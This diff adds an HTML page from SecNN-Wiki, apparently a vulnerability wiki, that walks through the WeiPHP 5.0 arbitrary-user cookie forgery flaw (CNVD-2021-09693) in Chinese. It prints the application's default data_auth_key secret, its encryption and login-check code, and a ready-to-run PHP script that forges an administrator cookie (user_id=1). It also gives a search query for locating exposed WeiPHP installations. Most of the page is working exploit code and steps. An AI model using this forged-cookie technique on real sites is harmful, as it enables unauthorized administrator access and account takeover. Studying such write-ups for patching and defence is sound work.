@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/WeiPHP/WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WeiPHP5.0 \u4efb\u610f\u7528\u6237Cookie\u4f2a\u9020 CNVD-2021-09693", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u5f71\u54cd\u7248\u672c", url: "#_2" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_4" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../WeiPHP%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../WeiPHP%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WeiPHP存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WeiPHP5.0%20download_imgage%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WeiPHP5.0%20download_imgage%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/" class="btn btn-xs btn-link">
+        WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="weiphp50-cookie-cnvd-2021-09693">WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693<a class="headerlink" href="#weiphp50-cookie-cnvd-2021-09693" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie</p>
+<h2 id="_2">影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>Weiphp &lt;= 5.0</a-checkbox></br></p>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a href="https://www.weiphp.cn/doc/Initialization_database.html">weiphp5.0官方下载参考手册</a></p>
+<p>参考官方手册创建网站即可</p>
+<p><img alt="img" src="../../../.vuepress/public/img/weiphp-1.png" /></p>
+<h2 id="_4">网络测绘<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>app="WeiPHP"</a-checkbox></br></p>
+<h2 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>首先需要得到数据库配置文件中的 <code>data_auth_key</code>密钥</p>
+<p><img alt="img" src="../../../.vuepress/public/img/weiphp-15.png" /></p>
+<p>得到这个配置文件可参照上一篇 <code>Weiphp5.0 前台文件任意读取</code></p>
+<div class="highlight"><pre><span></span><code>&#39;data_auth_key&#39; =&gt; &#39;+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T&#39;
+</code></pre></div>
+<p>全局查找下使用了这个密钥的地方</p>
+<p><img alt="img" src="../../../.vuepress/public/img/weiphp-16.png" /></p>
+<p>找到了跟据这个密钥的加密方法和解密方法</p>
+<p><code>加密方法 think_encrypt</code></p>
+<div class="highlight"><pre><span></span><code><span class="x">function think_encrypt($data, $key = &#39;&#39;, $expire = 0)</span>
+<span class="x">{</span>
+<span class="x">    $key = md5(empty($key) ? config(&#39;database.data_auth_key&#39;) : $key);</span>
+
+<span class="x">    $data = base64_encode($data);</span>
+<span class="x">    $x = 0;</span>
+<span class="x">    $len = strlen($data);</span>
+<span class="x">    $l = strlen($key);</span>
+<span class="x">    $char = &#39;&#39;;</span>
+
+<span class="x">    for ($i = 0; $i &lt; $len; $i++) {</span>
+<span class="x">        if ($x == $l) {</span>
+<span class="x">            $x = 0;</span>
+<span class="x">        }</span>
+
+<span class="x">        $char .= substr($key, $x, 1);</span>
+<span class="x">        $x++;</span>
+<span class="x">    }</span>
+
+<span class="x">    $str = sprintf(&#39;%010d&#39;, $expire ? $expire + time() : 0);</span>
+
+<span class="x">    for ($i = 0; $i &lt; $len; $i++) {</span>
+<span class="x">        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);</span>
+<span class="x">    }</span>
+<span class="x">    return str_replace(array(</span>
+<span class="x">        &#39;+&#39;,</span>
+<span class="x">        &#39;/&#39;,</span>
+<span class="x">        &#39;=&#39;</span>
+<span class="x">    ), array(</span>
+<span class="x">        &#39;-&#39;,</span>
+<span class="x">        &#39;_&#39;,</span>
+<span class="x">        &#39;&#39;</span>
+<span class="x">    ), base64_encode($str));</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>`解密方法 think_decrypt</p>
+<div class="highlight"><pre><span></span><code><span class="x">function think_decrypt($data, $key = &#39;&#39;)</span>
+<span class="x">{</span>
+<span class="x">    $key = md5(empty($key) ? config(&#39;database.data_auth_key&#39;) : $key);</span>
+<span class="x">    $data = str_replace(array(</span>
+<span class="x">        &#39;-&#39;,</span>
+<span class="x">        &#39;_&#39;</span>
+<span class="x">    ), array(</span>
+<span class="x">        &#39;+&#39;,</span>
+<span class="x">        &#39;/&#39;</span>
+<span class="x">    ), $data);</span>
+<span class="x">    $mod4 = strlen($data) % 4;</span>
+<span class="x">    if ($mod4) {</span>
+<span class="x">        $data .= substr(&#39;====&#39;, $mod4);</span>
+<span class="x">    }</span>
+<span class="x">    $data = base64_decode($data);</span>
+<span class="x">    $expire = substr($data, 0, 10);</span>
+<span class="x">    $data = substr($data, 10);</span>
+
+<span class="x">    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {</span>
+<span class="x">        return &#39;&#39;;</span>
+<span class="x">    }</span>
+<span class="x">    $x = 0;</span>
+<span class="x">    $len = strlen($data);</span>
+<span class="x">    $l = strlen($key);</span>
+<span class="x">    $char = $str = &#39;&#39;;</span>
+
+<span class="x">    for ($i = 0; $i &lt; $len; $i++) {</span>
+<span class="x">        if ($x == $l) {</span>
+<span class="x">            $x = 0;</span>
+<span class="x">        }</span>
+
+<span class="x">        $char .= substr($key, $x, 1);</span>
+<span class="x">        $x++;</span>
+<span class="x">    }</span>
+
+<span class="x">    for ($i = 0; $i &lt; $len; $i++) {</span>
+<span class="x">        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {</span>
+<span class="x">            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));</span>
+<span class="x">        } else {</span>
+<span class="x">            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    return base64_decode($str);</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>全局查看下使用了解密方法的地方</p>
+<p>在文件 <code>application\common.php</code> 中含有使用解密方法的代码，用于做身份验证</p>
+<div class="highlight"><pre><span></span><code><span class="x">function is_login()</span>
+<span class="x">{</span>
+<span class="x">    $user = session(&#39;user_auth&#39;);</span>
+<span class="x">    if (empty($user)) {</span>
+<span class="x">        $cookie_uid = cookie(&#39;user_id&#39;);</span>
+<span class="x">        if (!empty($cookie_uid)) {</span>
+<span class="x">            $uid = think_decrypt($cookie_uid);</span>
+<span class="x">            $userinfo = getUserInfo($uid);</span>
+<span class="x">            D(&#39;common/User&#39;)-&gt;autoLogin($userinfo);</span>
+
+<span class="x">            $user = session(&#39;user_auth&#39;);</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    if (empty($user)) {</span>
+<span class="x">        return 0;</span>
+<span class="x">    } else {</span>
+<span class="x">        return session(&#39;user_auth_sign&#39;) == data_auth_sign($user) ? $user[&#39;uid&#39;] : 0;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>根据这里得到的代码，可以知道当<code>user_Id=1</code>时,会解密密钥后判断是否正确，如果正确则可以登录系统</p>
+<p>我们在本地使用加密代码加密<code>user_id=1</code>得到的cookie则可以登录系统</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">think_encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T&#39;</span><span class="p">;</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="nv">$l</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+    <span class="nv">$char</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">==</span> <span class="nv">$l</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$char</span> <span class="o">.=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$x</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nv">$x</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expire</span> <span class="o">?</span> <span class="nv">$expire</span> <span class="o">+</span> <span class="nb">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$str</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span> <span class="o">%</span> <span class="mi">256</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+        <span class="s1">&#39;+&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;/&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;=&#39;</span>
+    <span class="p">),</span> <span class="k">array</span><span class="p">(</span>
+        <span class="s1">&#39;-&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;_&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;&#39;</span>
+    <span class="p">),</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s1">&#39;user_id = &#39;</span> <span class="o">.</span> <span class="nx">think_encrypt</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/weiphp-17.png" /></p>
+<p>添加<code>cookie: user_id=xxxxxxxx</code>即可成功登录</p>
+<p><img alt="img" src="../../../.vuepress/public/img/weiphp-18.png" /></p>
+<p><img alt="img" src="../../../.vuepress/public/img/weiphp-19.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../WeiPHP%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../WeiPHP%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WeiPHP存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WeiPHP5.0%20download_imgage%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WeiPHP5.0%20download_imgage%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/" class="btn btn-xs btn-link">
+        WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
